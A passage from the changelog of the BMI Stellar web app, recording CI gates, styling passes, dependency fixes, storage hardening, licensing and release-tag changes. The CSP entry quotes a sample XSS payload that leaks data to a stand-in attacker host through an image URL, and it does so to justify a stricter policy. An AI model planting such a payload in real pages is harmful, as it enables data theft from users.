  Open Source & Release card's info list gained a `Repository:` row
  directly under the Status row - the GitHub mark (a new inline
  `src/lib/ui/GitHubMark.svelte`, octicons-licensed path, because
  lucide ships no brand icons) links `github.com/oxyzenQ/bmi` in a new
  tab with `rel="noopener noreferrer"`. The link is styled into the
  info-row family (cosmic-purple mark, underlined white label,
  cosmic-purple hover, the global focus outline) and wraps as a unit
  under the 375 x 667 floor check with zero horizontal overflow. The
  two dead `about.status_stable` / `about.status_rc` keys left all
  four locales so the new `about.repo` key fits the ja/zh LOC
  ratchets, which moved down: ja 677 -> 675, zh 632 -> 630.

- **The name-case law with its strict gate, and the CI naming
  consistency pass (night-improve-8).**
  `scripts/gates/check-name-case.py` enforces the BRANDING name law over
  every tracked file and path - nothing excluded, untracked working-tree
  files included so a violation fails before the commit: "BMI Stellar" is
  the prose form, "bmi-stellar" the identifier family, the caps
  spellings and the scripts/ gate banners are the recorded exceptions,
  and the incorrect forms (BRANDING 2.2) are quotable only inside
  ~~strikethrough~~. The checker is self-clean by construction and was
  proven live: it flagged its own draft comment before the comment was
  fixed, and a planted wrong-case file fails with `file:line:token`.
  The gate-keepers lane gained the emoji sweep (frozen history keeps
  its emoji, the zelynic skip-set convention) and the name-case
  section. All nine workflows now carry the zelynic "Guard" naming
  without emoji (`Stellar Guard - CI`, `Stellar Guard - CodeQL`,
  `Stellar Guard - Gate-keepers`, ...), run unfiltered (the paths and
  the malformed `branches: ain, dev]` filter - a real defect where a
  flow-sequence opening had been eaten - are gone), pin
  `ubuntu-24.04`, and use the `${{ github.workflow }}-${{ github.ref }}`
  concurrency key. The five README demo alt texts moved into the prose
  family.

- **The wholesale gate-keepers lane, the commit gate, and the permission
  law (night-improve-5).** `scripts/gate-keepers.sh` is the zelynic-style
  wholesale non-code lane: ten numbered sections (hook self-install,
  bash -n, shellcheck, yamllint --strict, actionlint, codespell, the
  644/755 permission guard, the scripts LOC cap, the actions-pin shape
  in strict mode, the version surfaces), counters that name every skip,
  and one verdict. `.githooks/pre-commit` is a shim that execs
  `scripts/gates/check-commit-gate.sh` (the cheap fail-closed lane;
  self-installed by the gate and by `scripts/setup.sh`, the new
  three-phase bring-up). `.github/workflows/gate-keepers.yml` runs the
  lane in CI with pinned tools (yamllint 1.37.1, codespell 2.4.1,
  actionlint 1.7.7 verified by checksum). The lane's first live run
  caught real debt and forced the fixes: 31 pin comments re-spaced for
  yamllint, a 364-character release-note line split, two missing YAML
  document starts, and the repo-wide mode drift normalized - every
  tracked file was committed at 755 since the first commit; the tree is
  now 219 files at 644 and 10 shebang executables at 755, enforced by
  `scripts/gates/check-permissions.sh`. A docs index (`docs/README.md`)
  and the full infra audit (`docs/AUDIT-INFRA-2026-11.md`) map the
  zelynic discipline sync, including the honest N/A list.

- **The gatekeeper speaks: -V and doctor (night-improve-6).**
  `scripts/build.sh` gained `-V`/`--version` (one line, read live from
  `package.json` - the single source of truth, the way the zelynic build
  script reads Cargo.toml, so the banner can never drift from a bump) and
  a `doctor` subcommand with the zelynic-style tree output: Bun vs the
  `packageManager` pin, Node vs the engines range, git identity,
  pre-commit hook wiring, gate/workflow inventory, version-surface sync,
  and actions-pin health, each row `[OK]`/`[WARN]`/`[FAIL]`, exit 1 on
  any failed check.

- **Complete package metadata (night-improve-4).** `package.json` now
  carries the full discovery surface - `repository`, `bugs`, `homepage`,
  and `funding` (the Ko-fi lane the README badge already pointed at) -
  alongside the existing `description`, `keywords`, `author`, `license`,
  `engines`, and `packageManager`. The README tells the packaging story
  once: the package is private, the app ships as a Vercel-deployed web
  app, nothing is published to the npm registry.

- **Version-surface parity gate and the version-to changelog ability
  (night-improve-3).** `scripts/gates/check-version-sync.ts` enforces the
  version triangle - `package.json` is the source of truth, `DORMANT.md`'s
  capsule line and `README.md`'s new "Current release: `vX.Y`" line must
  carry the same version (surfaces are probed honestly: an existing but
  disagreeing surface fails, an absent surface is reported, never policed
  when absent). `scripts/dev/version-to.ts` gained the zelynic
  version-to.sh ledger ability: every bump splices a
  `## [X.Y.Z]` section directly under `## [Unreleased]`,
  with honest no-write probes for a missing anchor or an already-recorded
  version. The gate joins check-all, quick, audit, and the ci.yml
  workflow.

### Changed

- **The five README demo captures re-shot against the current build
  (demo-refresh-1).** Every `assets/demo-bmi-stellar-*.png` surface was
  regenerated in a headless browser against the production preview, so
  the README now shows the zelynic purple rebrand instead of the
  pre-rebrand purple: the welcome hero, the empty gauge, the active
  gauge, the calculator + results pair, and the full BMI snapshot card
  with its three-entry history trend. Each scenario replays the exact
  data state of the capture it replaces (24 y / 181 cm / 67 kg giving
  BMI 20.45 for the active states, the 67 -> 70 -> 88 kg ledger for the
  snapshot), and the snapshot frame grew to 889 x 1150 because the
  rebranded card no longer fits the old 781 px window. Filenames are
  unchanged, so the README markup is untouched;
  `assets/signature.b3sum` and the `assets/signature-assets.md` table
  rows move in the same commit per the documented refresh policy.

- **A depth responsive audit at the 375 x 667 floor came back clean
  (night-style-2, recorded in docs/responsive-audit-375.md).** Every
  pager section was stepped end to end in a real headless browser at
  the owner's smallest supported viewport (plus the 667 x 375
  landscape rotation) under a DOM-wide scanner that flags page-level
  horizontal scroll and out-of-bounds boxes; the success modal,
  language picker, Secure Export modal, the scrollable nav chip bar,
  and a live-generated share card were exercised on top. Zero
  overflow findings on every surface - the document records the
  method, the per-surface results, and the re-run trigger.

- **The wallpaper stack lifted out of near-black into a visible,
  moody masterclass backdrop (night-style-2).** Four layers were
  stacking to almost total darkness - desktop dimmed the wallpaper to
  40% brightness under a 25-45% black gradient, mobile ran it at 50%
  opacity under a 45-65% gradient. The wallpaper now renders at 55%
  brightness on desktop / 65% opacity on touch devices, and the
  overlays ease to 16-32% (desktop) and 28-45% (mobile), so the
  blackhole art actually reads while the content glass keeps its
  contrast; the stale comments that quoted the old values follow.

- **Encrypted exports moved to format identifier `bmi-encrypted-v3`
  (night-style-2, owner call).** New backups emit v3 while the cipher
  stack is unchanged (AES-256-GCM, Argon2id with PBKDF2 legacy
  fallback, SHA-256 ciphertext checksum); decrypt, `isEncrypted`, and
  the import preview all still accept legacy `bmi-encrypted-v1`
  payloads, so every existing export remains readable and the
  fixture-based tests now double as backward-compatibility coverage.
  SECURITY.md, DORMANT.md, and docs/furthermore.md document the new
  identifier.

- **The share card footer dropped the purple gradient brand line for
  the site footer's quiet grey (night-style-2).** The line used to
  render `BMI Stellar - by rezky_nightky (oxyzenQ) - vN` through a
  five-stop violet-to-lavender text gradient with a version suffix;
  it now reads the plain neutral `curiosity - by oxyzenQ` - the
  owner's zelynic masterclass theme name - in the card's muted grey
  tier (rgba(255,255,255,0.56)) above the existing faint meta row, so
  the brand signature stays subordinate exactly like the site footer.
  The version suffix, the `getAppVersionShort` import, the
  `share.card_branding` key in all four locales, and its test mock
  are removed with it; the file lands at 961 lines (963 -> 961, ledger synced).

- **The share card's canvas joined the brand: a purple-black gradient
  background and every canvas purple hue-converged (night-style-2).**
  The card base was flat `#000000` with a 3% purple whisper; it now
  paints a vertical brand-hue gradient (`#1b0a30` through `#0d0518`
  into black) with the existing radial depth layer promoted to a real
  `rgba(168,85,247,0.13)` glow at the same center, so the top of the
  card visibly carries the zelynic brand purple before fading to
  void. All 28 remaining canvas purple literals (frame stroke, crown,
  aura, pill strokes, the PREMIUM brand ramp) follow the same
  one-hue map as the stylesheet tree; the file also drops 6 lines
  below its 969 watermark (963 now recorded in the ratchet ledger).

- **Every purple in the UI now converges on the zelynic brand purple
  #A855F7 (RGB 168,85,247), the cosmostrix branding color shared
  across the owner's projects (night-style-2).** The stylesheet tree
  carried five different purple hues (128,0,255 neon, 139,92,246
  violet, 154,77,255 cosmic-blue, 147,51,234 plum, plus indigo-leaning
  anchors 91,33,182 / 91,76,224); a repo-wide hue inventory found 69
  literals and every one now maps to the brand hue with its alpha and
  luminance role preserved - the violet/purple/neon ladders are
  alpha steps of #A855F7, the button/void gradients ride its
  tailwind-purple dark ramp (#6b21a8 / #7e22ce / #581c87 on the
  retinted brand-hue near-black #120420), and the light tiers land on
  #c084fc / #e9d5ff. The brand contract is documented at the top of
  tokens.css; dev-console cosmetics (trace, warn-dev, dev-diagnostics)
  and inert component fallbacks follow the same hue, and the
  share-card canvas gets its own brand pass in the entries below.

- **A stylesheet hygiene pass cleared the dead weight from the
  design-token layer (night-style-1).** Cross-referencing every class
  and custom property against all consumers (markup, svelte style
  blocks, ts inline styles, static html) removed the never-landed
  `.section-header-v2` refactor spread across seven stylesheets, the
  unused `.notify-backdrop` and `.warn-ic`/`.warn-ic-lg` rules, three
  tokens orphaned by them, and 137 zombie design tokens - unused
  palette steps, dead glass/plasma knobs, the four `--wallpaper-*`
  duplicates of `page-theme.ts` THEME_URLS, and the unused `--z-overlay`
  plus `--modal-z-top`/`--modal-z-staging` aliases - together with the
  dead `--pager-edge-fade`, the four unread `--ref-row-accent`
  declarations, and the Layer 2 line of the z-index ladder doc.
  tokens.css fell from 641 to 491 lines, below the 600 ratchet, so its
  ledger entry is removed in the same change; the audit now reports
  zero zombie classes and zero unconsumed stylesheet tokens. The
  remaining residue is also resolved: all 21 pre-existing dangling
  `var()` references are now bound to real values - thirteen new
  family-consistent tokens (`--w-40`, `--sd-65`, `--sg-18`,
  `--blue-25`, `--deep-void-50`, the `--cat-*-50` scale quarter,
  `--slate-300-solid`, `--violet-300-solid`, `--green-500-solid`,
  `--cyan-500-solid`) plus remaps onto existing tokens whose value
  already matched (`--warn-amber`, `--red-500-solid`, `--slate-500-solid`,
  `--violet-30`/`--violet-20`), so every fallback that shipped is
  preserved bit-for-bit; the sparkline crosshairs move from
  presentation attributes (where `var()` is invalid) to style
  attributes, and the gauge-skeleton zone bar now uses the same
  `--cat-*-50` ramp as the risk scale. The set-but-never-read
  `--gauge-pulse-dur` chain in BmiRadialGauge is gone too: the unused
  state, its tier assignment, the inline custom property, and the two
  orphaned `GAUGE.PULSE_DUR_*` constants in animation-config.

- **The welcome-page logo, the share-card gauge, and the container
  hover language were refined (night-engrave-1).** The hero avatar
  served the same 512px/282KB master PNG for every `srcset` slot, so
  the width descriptors did nothing; the slots now point at the real
  master assets they name (128/192/256/512) and the default `src`
  dropped to the 256px master, so the browser always lands on the
  smallest file that still covers the layout size at the current
  device pixel ratio - 108px @1x pulls 20KB instead of 282KB while 3x
  viewports still receive the 512px master for full sharpness. The
  generated result card drew its BMI circle at radius 52 beside the
  150px numeral; after an operator field test asked for +1.5x again the
  circle now runs at radius 96 as a top-right corner stamp at (890,
  190), with all dependent weights rescaled (track stroke 12, marker
  dot 13/10 at a 3.5 outline, labels 33/25px) and the geometry verified
  against the card grid: the track edge clears the header text, the
  divider fade and the category pill.
  The glass containers (`.bmi-card`, `.footer-disclaimer`,
  `.about-card`, `.gauge-container`, `.reference-table`,
  `.form-card`) no longer run the hover shine sweep: the 200% x 200%
  `::before` gradient layer, its `:hover` trigger and the two mobile
  defense blocks that hid the pseudo-elements are gone, while the
  clipping containment rule stays because absolutely positioned
  children depend on it; hover now rests on the lift and border
  transition only.

- **The five README demo screenshots were re-shot against the live
  production build.** All five `assets/demo-bmi-stellar-*.png` surfaces
  (home page, gauge, gauge active, results, snapshot) were captured from
  a real browser session on the `vite preview` build with the new 2026
  Stellar mark and the new space wallpaper visible, showing `Art: Space`
  in the nav. The data story is preserved and verified against the
  published formulas: metric 24y/181 cm/67 kg male at activity 1.725x
  renders BMI 20.45, BMI prime 0.82, ideal range 60.6-81.9 kg, and TDEE
  2909 kcal/day; the snapshot accumulates the same three history entries
  (20.45, 21.37, 26.86) for a 79% progress bar, a 26.86 current, a 21.37
  best, and the target 22.00. Captured at 1.5x pipeline scale (Lanczos
  downsize to the recorded pixel dims) and re-signed: the five BLAKE3
  rows in `signature.b3sum` and `signature-assets.md` moved with the
  bytes. _(this commit)_

- **Wallpaper refresh: the space art swaps to the 2026 oxyzenQ plate, and
  a fourth theme "Telescopic Cosmic" lands.** The `space` theme now
  renders `static/images/oxyzenq-lite.webp` (the neon-purple OXYZENQ
  space scene; 59 KB WebP, down from a 672 KB PNG source), replacing the
  retired `oxyzen-zenlysium.webp`. The new `telescopic` theme ships
  `static/images/telescopic-cosmic.webp` (a radio dish beaming into a
  purple galaxy; 234 KB WebP, down from a 10.6 MB PNG source), wired
  through every sync point: `page-theme.ts` (`THEMES`/`THEME_URLS`), the
  `--wallpaper-*` tokens, the pre-paint `app.html` map, `THEME_LABELS`,
  the pager theme classes, and all four locales. Both arts are WebP at
  1920 px (quality 80, encoder effort 6) per the recipe now recorded in
  `assets/tools.md`. The 600-line ratchet watermarks for the four touched
  legacy files each moved +1 with the feature (`ja.ts` 677, `zh.ts` 632,
  `+page.svelte` 940, `tokens.css` 641) — visible debt in the diff, and
  the ratchet still only moves down between features. _(this commit)_

- **Brand surface swapped to the 2026 Stellar mark, with rounded PWA
  derivatives.** The 1254×1254 master plate
  (`docs/assets/bmi-logo-masters.png`) now carries the new neon-purple
  emblem art (byte-identical to the owner upload), and all seven
  web-facing PWA derivatives (128, 180, 192, 216, 256, 512, 1024) were
  regenerated with rounded corners — a 68 px CopyOpacity alpha mask cut
  at the master size, then a Lanczos downscale; the exact recipe is
  recorded in the new `assets/tools.md` (the bmi mirror of zelynic's
  local-tools notes). The maskable tile stays opaque and
  square-cornered: the emblem sits inside the PWA safe zone (72% scale)
  on the art's own background color. The BLAKE3 signature rows and
  `signature.b3sum` moved in the same commit per the refresh policy.
  _(this commit)_

- **GitHub Actions pins healed to full 40-hex SHAs, with the zelynic-aligned
  self-heal engine (night-improve-2).** All 30 `uses:` pins across the 8
  workflows moved from floating version tags to immutable release commit SHAs
  (`actions/checkout@<sha> # v7.0.1, SHA pin` style), with the release tag
  kept readable as a trailing comment. The heal landed through the new
  `scripts/ci/actions-version-sweep.sh` (`--dry-run` / `--apply`, annotated
  tags peeled, fail-closed write guard) and `scripts/gates/check-actions-pins
.sh` now enforces the shape (warn locally, strict in CI); both were proven
  live against a planted tag pin. Several pins had silently drifted 2-3
  majors behind (checkout v5, cache v5, download-artifact v6, upload-artifact
  v5, setup-node v6) because the old weekly lane only bumped inside a major;
  the rewired self-heal workflow now crosses majors the way zelynic's engine
  does and commits as `Internal research:` per the house convention.

- **LOC discipline tightened to the zelynic three-tier law (night-improve-7).**
  The single 1000-line cap is now three tiers: the 1000-line hard cap stays;
  a 600-line ratchet (`scripts/loc-ratchet.json`) records the 14 legacy core
  files at or above 600 lines at their current size and they may never grow;
  and `scripts/gates/check-scripts-loc.sh` enforces the 1000-line cap for
  `scripts/**` with zelynic's `# LOC_EXEMPT:` self-declared IOU marker. New
  source files must stay under 600 lines; existing debt can only shrink.

- **scripts/ tree reorganization (zelynic-aligned layout).** The flat
  `scripts/` directory now follows the zelynic gate discipline: atomic gates
  live in `scripts/gates/` (one concern per file), the version manager moved
  to `scripts/dev/version-to.ts` (renamed from `scripts/bmi-update-version.ts`;
  the `bun run bmi-update-version` and `bmi-bump:*` aliases keep working),
  shared gate code lives in `scripts/lib/`, and `scripts/ci/` is reserved for
  CI-lane helpers. All `package.json` script paths and living-doc references
  were re-pointed; no gate behavior changed.

- **`scripts/build.sh` speaks the zelynic `-q` / `--quiet` essentials
  contract (night-improve-6).** The flag reduces a gate run to per-step
  `OK` / `FAIL` verdict lines with no banners and no streamed step output
  (the CI shape); a failed step still prints the tail of its log so the
  failure stays diagnosable without a re-run. The argument parser no
  longer silently ignores a second positional argument - a mistyped
  invocation fails loud with exit 2 instead of quietly running the wrong
  gate. Verified with `bash -n`, `shellcheck -x`, the audit lane under
  `-q`, and the full gate-keepers lane.

- **The BLAKE3 signature lock for the brand surface.** Every image
  under `assets/`, `docs/assets/`, and `static/assets/` (the five demo
  captures, the logo master, and the eight PWA logo derivatives) now
  carries a recorded BLAKE3 digest in `assets/signature.b3sum`, with
  the policy and the verification commands documented in
  `assets/signature-assets.md`, so a future swap, duplicate, or
  re-encoded fake of the logo is detectable against the committed
  bytes. Digested with `b3sum 1.8.7` (proven against the published
  known-answer vectors) and cross-verified against an independent
  BLAKE3 implementation. The new `scripts/gates/check-signature-assets
.sh` enforces both directions in the gate-keepers lane (section 12): a
  modified or unlisted image fails, a listed-but-vanished file fails,
  and CI installs and known-answer-proofs `b3sum` itself so the gate
  never silently skips.

### Fixed

- **The automatic update check no longer fires on every load (LTS
  readiness audit).** The timer-driven check now runs at most once
  every 12 hours per device (`shouldRunAutoUpdateCheck` +
  `bmi.updateCheckAt`; failed or offline attempts are not recorded so
  the next load retries), while manual checks in About and
  service-worker-driven confirmations stay immediate. Proven live at
  the network level: seeded key, zero requests across a reload;
  cleared key, exactly one request pair. Three new unit tests cover
  the helper; the README Limitations line states the throttled
  behavior. The full end-to-end real-usage audit (every computed
  number verified exact against its formula in a real browser, 515
  tests green) is recorded in `docs/AUDIT-LTS-2026-11.md`.

- **CI audit failures** — `bun audit` reported 17 vulnerabilities in transitive deps after a dormant period. Bumped `overrides` (undici ^7.29.0, tar ^7.5.22, postcss ^8.5.25, brace-expansion ^5.0.9) and dev-dep `@sveltejs/kit` 2.60.1 → 2.70.2. Result: 0 vulnerabilities. _(eff8369)_
- **Missing local gatekeeper** — added `scripts/build.sh` (5 modes: `check-all`, `quick`, `audit`, `test`, `build`) that mirrors `.github/workflows/ci.yml` step-by-step. _(eff8369)_
- **Error page type-check failure** — svelte-check 4.7.x rejects type arguments on `$props()`, breaking type-check in CI and the weekly maintenance workflow. Replaced the generic form with a type annotation on the `$props()` variable in `src/routes/+error.svelte`; the props object stays intact because destructuring is disallowed in SvelteKit route components. _(d7b6836)_
- **Dependency audit red gate** — `bun audit` reported 22 advisories (7 high) against the committed lockfile. Refreshed within pinned ranges via targeted override bumps: vitest 4.1.12, undici ^7.29.1, brace-expansion ^5.0.12, devalue ^5.9.3, source-map-js ^1.2.2, postcss-selector-parser ^7.1.6, `@humanfs/node` ^0.16.8. Advisories with no fix inside the pinned majors (glob, minimatch, SvelteKit 2, deepmerge) are now tracked by the audit policy instead of failing the gate. _(7ae8ed0)_
- **License upgrade to AGPL-3.0** — upgraded the project license from GPL-3.0-only to AGPL-3.0-only (GNU Affero General Public License v3, 19 November 2007): replaced `LICENSE` with the canonical AGPL text, rewrote the SPDX header in every core file, set the manifest license to `AGPL-3.0-only`, updated the user-facing license label in the About section, and synced README, TRADEMARK.md, and DORMANT.md references. Historical entries keep their original license names. _(this commit)_
- **Untrusted import file hardening** — history import/export record validation only checked `typeof === 'number'`, so JSON literals like `1e999` (parsed as `Infinity`) and far-future timestamps from hostile or corrupted files could pass the legacy checksum gate and persist into history storage, corrupting `Date` handling, sparkline scaling, and CSV/ISO formatting downstream. Record validation now rejects non-finite values, enforces the same bounds the calculator applies (`INPUT_LIMITS`), caps timestamps with a 24-hour clock-skew allowance, and validates the age field. CSV category mapping now reuses the shared `classifyBmi`/`getCategoryLabel` helpers instead of duplicating the classification thresholds. Six regression tests cover the non-finite, out-of-bounds, far-future, and negative-age vectors plus the no-over-tightening control. _(this commit)_
- **Validated history read path** — the display and write-back reads (`BmiHistorySparkline`, `BmiSnapshot`, `BmiForm` export summary, `saveBmiToHistory`) still trusted raw storage contents, so records that predate the import hardening or enter via IndexedDB backup restore could reach the UI as an Infinity best-BMI badge, broken sparkline scaling, or endlessly re-persisted poison. Added a single validated accessor `readBmiHistory()` in `bmi-history.ts` that reuses the hardened `isValidRecord` guard from `history-io.ts`; all four consumers now share it and every save purges poison from storage (self-healing). Six tests cover the poisoned read via a raw `1e999` JSON literal, non-array payloads, malformed JSON, legacy no-age records, the self-healing save, and signature dedupe. _(this commit)_

### Changed

- **README test-lane counts synced** — 464/30 → 512/34 after the paranoid-masterclass hardening suites (math precision, IndexedDB atomicity, KDF worker transport, PWA offline logic). _(this commit)_
- **PWA update logic covered and offline path proven** — new 12-test suite covers commit-id normalization, exact-equality commit matching (prefix collisions rejected), version/commit update decisions, and the offline update check (explicit `offline` status with zero fetches). Verified live in airplane mode: after the service worker precached 69 assets, the app reloaded from cache and generated a real `bmi-encrypted-v1` backup (Argon2id 64 MiB × 3 + AES-256-GCM) with the network severed. _(this commit)_
- **Argon2id offloaded to an inline Web Worker** — the 64 MiB × 3 key derivation blocked the main thread for ~4.3 s during encrypted export/import (measured on a production build). It now runs in a bundled inline worker (`?worker&inline`, offline-safe): the same import shows a 50 ms max frame gap with the UI fully responsive. Worker failures fall back to the main thread with byte-identical hashes; construction failures retry, post-start crashes latch the worker off for the session. AES-GCM remains async WebCrypto. _(this commit)_
- **IndexedDB writes settle on transaction commit** — `dbSet`, `dbRemove`, `dbMetaSet`, `dbBackupSave`, and `dbBackupDelete` resolved on request-level success, which fires _before_ the transaction commits; a quota abort or browser kill during the commit phase resolved the write successfully while the data silently rolled back. All five helpers now resolve on `tx.oncomplete` and reject on `tx.onabort`/`tx.onerror`, and a new 8-test atomicity suite proves rollback: an aborted write leaves the previous value intact and a mid-commit failure is always observed by the caller. _(b62bdc4)_
- **Exact unit conversion constants and unit-tested TDEE math** — replaced the truncated pound constant (0.453592) with the exact 1959 international value (0.45359237), removed its duplicated inline copy from the BMR block, and extracted the Mifflin-St Jeor BMR and the five published activity factors (1.2/1.375/1.55/1.725/1.9) into pure, unit-tested functions in `bmi-calculator.ts`. New 21-test precision suite covers extreme-but-valid inputs (50 cm, 250 cm, 10 kg, 300 kg, unit ceilings), sub-1e-12 conversion error, and exact BMR/TDEE values at ages 1–120. _(4cf48c1)_
- **CSP `img-src` hardened to an explicit allowlist** — the production Content Security Policy allowed `img-src https:`, letting any HTTPS host serve images. If an XSS had ever been found, an attacker could have exfiltrated data through image loads (`<img src="https://attacker.example/log?data=…">`). A full source sweep confirmed nothing loads remote images (hero logo, favicons, manifest icons, and wallpapers are all same-origin; the share card exports through `blob:`; Ko-fi appears only as a README badge, never inside the app), so the wildcard is now removed: `img-src 'self' data: blob:`, with named Vercel preview hosts added only on non-production deployments. Verified live against a production build: the strict header is served, logo and wallpapers render, and the Save Image blob export runs with zero CSP violations. CSP strictness documented in SECURITY.md and README.md. _(this commit)_
- **Documentation sync** — corrected 11 discrepancies across README.md, DORMANT.md, BRANDING.md, and docs/furthermore.md (test counts, CSS cascade count, storage keys, lazy-load registry, CI/CD workflow inventory, accent color hex values, release-process gate). _(e29e94b)_
- **Policy-gated dependency audit** — `audit:deps` now runs `scripts/audit-deps.ts` instead of raw `bun audit`: critical/high/moderate advisories fail the gate unless an unexpired entry in `scripts/audit-allowlist.json` accepts them, low advisories warn. Expired, stale, or severity-mismatched allowlist entries fail closed, so the acceptance list cannot rot into a permanent silence switch. _(this commit)_
- **CI timeout hardening** — added `timeout-minutes` to the jobs that lacked it (CI 15, Documentation CI 10, release validate-tag 5, release build/upload 20), so a hung runner fails fast instead of burning the 6-hour GitHub default. Every scheduled and push-triggered workflow now carries an explicit job timeout. Also bumped the PWA manifest cache-buster in `app.html` from `21.5.0` to the current version so installed clients re-fetch `manifest.json`. _(this commit)_
- **Self-heal push hardening** — the weekly action-version workflow now fetches and rebases between push attempts and exits non-zero when all attempts are exhausted, instead of reporting a silent success while the version bump never landed. _(this commit)_
- **Offline precache diet** — moved the 1254×1254 brand master (`bmi-logo-masters.png`, 1.0 MB) from `static/assets/` to `docs/assets/`. The service worker precaches every file under `static/`, and the master was referenced by no manifest, page, or style — only by the branding docs. Web-facing PWA derivatives (192 through 1024) stay in `static/assets/` unchanged, so install icons, favicon, and maskable icons stay pixel-identical; installs now ship about 1 MB less on first load. BRANDING.md updated to the new path. _(this commit)_
- **README synced to the zelynic convention** — rebuilt `README.md` on the owner's mature-project template: license header comments, an AI-agents notice, centered hero with tagline and flavor quote, badge row (version + license + Ko-fi), a "Why bmi?" section with a mechanism-anchored edge table and a vs-typical-tools comparison, honest limitations (screening metrics, unencrypted at-rest local storage, forgeable legacy checksums), a layered architecture diagram, philosophy (IS / NEVER BE + maintenance mode), a test-lane table (464 tests, 30 suites — refreshed from the stale 452/29), release verification, the trademark and forking policy, and the closing documentation-disclaimer block. Added `AI_AGENTS_READ_THIS.md` adapted to bmi's single AGPL-3.0-only license. Restored the three version-sync anchors (`BMI Stellar v21.8` display string, `badge/version-v21.8-` badge, `alt="Version v21.8"`) so `bmi-update-version` syncs the README again instead of skipping it — verified with a `--dry-run` reporting all three "already current". BRANDING.md: removed the stale all-caps-hero row that referenced a hero the README no longer has. _(this commit)_

### License

- **Pricing restructured to the White-Label Focus ladder.** BMI Stellar
  is positioned as local-first health infrastructure. Added Professional
  ($999), Business ($2,199), Enterprise Internal ($14,999), and
  White-Label/OEM ($49,999/year or $99,999 one-time + 20%). Personal
  (Free) and Individual ($99) unchanged. Docs-only; no code changes.

### Changed

- **The dev-lane version manager became the zelynic shell entry.**
  `scripts/dev/version-to.ts` is now `scripts/dev/version-to.sh` - a
  self-contained bash port runnable exactly like zelynic's
  `./scripts/dev/version-to.sh`: direct execution with no bun
  invocation, the bare call prints the current version and usage,
  `v`-prefixed or bare semver sets an absolute version, the
  `patch|minor|major` bump words survive from the TypeScript tool, and
  the zelynic `--commit` flag stages the touched surfaces and commits
  them as `chore: prepare for release vX.Y.Z` (the RELEASE.md
  convention). Every surface contract is preserved (package.json
  source of truth, the README current-release line with its honest
  absent-surface probes, the DORMANT.md capsule, the CHANGELOG.md
  splice under `## [Unreleased]`, and `--dry-run` writes nothing);
  `--commit` refuses an unchanged tree and stages only the four
  surfaces, and `bun run bmi-update-version` / `bmi-bump:patch|minor|major`
  keep working through the repointed package scripts. One
  implementation, one file - no dual version manager to drift.
  _(this commit)_

- **Release artifacts verify with SHA-512 sidecar checksums.** The
  release pipeline (`.github/workflows/release.yml`) writes
  `sha512sum` sidecars (`bmi-stellar-*-<TAG>.zip.sha512sum`) instead of
  SHA-256, the GitHub Release upload list carries the new extension,
  and the README release-verification block plus the
  `.github/RELEASE.md` artifacts table follow. Already-published
  releases keep their `.sha256` sidecars; the next tag is
  the first one verified with `sha512sum -c`. The app-internal
  integrity hashes (the AES-GCM backup envelope checksum and the
  HMAC-SHA256 export signatures) are untouched - different lane,
  different contract. _(this commit)_
- **Space is the out-of-box wallpaper theme.** Fresh visitors now
  land on the space wallpaper (`oxyzenq-lite.webp`) instead of
  blackhole: the Svelte state default (`+page.svelte`), the
  pre-paint CSS fallback (`--wallpaper-current` in `tokens.css`),
  and the theme button's pressed semantics (`aria-pressed` reports
  unpressed only for the factory default) move together, so SSR
  markup, the no-JS wallpaper, and hydration stay in agreement.
  Returning visitors keep their saved `bmi.wallpaperTheme` choice -
  the anti-flash inline script in `app.html` applies stored values
  only and needs no change. _(this commit)_
- **The website displays the full semver release version.** The About
  section label read `Stellar v80.0` for a `80.0.0` release because
  `getAppVersionShort()` stripped the patch segment; the helper is
  now `getAppVersionDisplay()` and returns the exact `package.json`
  version (fallback `0.0.0`), so the About label, the hero edition
  line, and the document title all read `v80.0.0`. The README
  release line carries the same full `vX.Y.Z` form - one version
  format everywhere. Backup envelopes and the PWA version compare
  already
  consumed the raw full version and are untouched. _(this commit)_
- **The tag convention drops the Stellar prefix - one version format
  everywhere.** Release tags are now plain semver
  (`v<major>.<minor>.<patch>`, for example `v80.0.0`) matching
  `package.json` exactly, replacing the short
  `Stellar-v<major>.<minor>` shape. The release workflow triggers on
  `v*` tags and validates the tag against the full package.json
  version instead of the major.minor pair; version-to.sh rewrites
  every README surface to the full `vX.Y.Z` form (its
  current-release probe accepts the retired short shape so a bump
  migrates it in place), commits as `chore: prepare for release
vX.Y.Z`, and splices a plain `## [X.Y.Z]` changelog heading;
  check-version-sync polices the full form and fails a lingering
  short-form surface, so the README surface migrates in the same
  commit. Already-published `Stellar-v*` tags keep their names; the
  first `v*` tag is the next release. _(this commit)_

- **Release tags accept a pre-release suffix (`vX.Y.Z-<suffix>`).** A
  tag like `v80.0.0-night.1` now rides the same pipeline: the release
  workflow validates the suffix shape (syntax only - the tag shape is
  the channel, no whitelist to maintain), classifies it with the
  pre-release branch first (a glob * crosses '-'), flags the GitHub
  Release as a pre-release that is never marked "latest", and computes
  stable release notes from the nearest previous STABLE tag so a
  skipped pre-release never truncates a stable's changelog.
  version-to.sh accepts the suffix on every surface (package.json,
  the four README surfaces, the DORMANT.md capsule, the changelog
  heading) and its bump words operate on the numeric core (patch from
  `80.0.0-night.1` gives `80.0.1`); check-version-sync polices the
  same shape everywhere. The zelynic release contract, mirrored.
  _(this commit)_

### Removed

- **Dormant static-deploy config** — removed `svelte.config.static.js` and its `@sveltejs/adapter-static` devDependency. The project deploys via `@sveltejs/adapter-vercel` (`svelte.config.js`); the alternate static config was referenced by no build, script, or doc — only by tolerant workflow path filters and a `|| true` release-staging copy, all of which are cleaned up in the same change. _(this commit)_

---

## [21.7.0] — Stellar-v21.7

### Fixed

- **svelte-check compatibility** — pinned Node.js to v22 LTS in CI after `svelte-check` started failing on Node 24. _(3f4a1e4)_
- **Maintenance deps regression** — reverted a broken weekly dependency bump and re-pinned `typescript` to a known-good version. _(f16f9b1)_
- **Lint error in `+error.svelte`** — resolved `svelte/valid-prop-names-in-kit-pages` after a SvelteKit schema change. _(5ea270f)_

### Changed

- **Release workflow simplification** — streamlined `release.yml` and accompanying docs. _(4fdd307)_
- **Test suite cleanup** — removed future-roadmap placeholders and duplicate test bloat. _(2a19413)_

### Chore

- Weekly dependency refresh, GitHub Action version self-heal, prettier formatting pass on `+error.svelte`. _(c56b18f, ef385b8, e5297f8, ad9e263)_

---

## [21.6.0] — Stellar-v21.6

### Fixed

- **10 dependency vulnerabilities** — resolved advisories in `undici`, `tar`, and `vite` via `package.json` overrides without breaking the frozen lockfile. _(30d77eb)_
- **esbuild GHSA-gv7w-rqvm-qjhr** — pinned `esbuild` to a patched version. _(78d4f02)_

### Changed

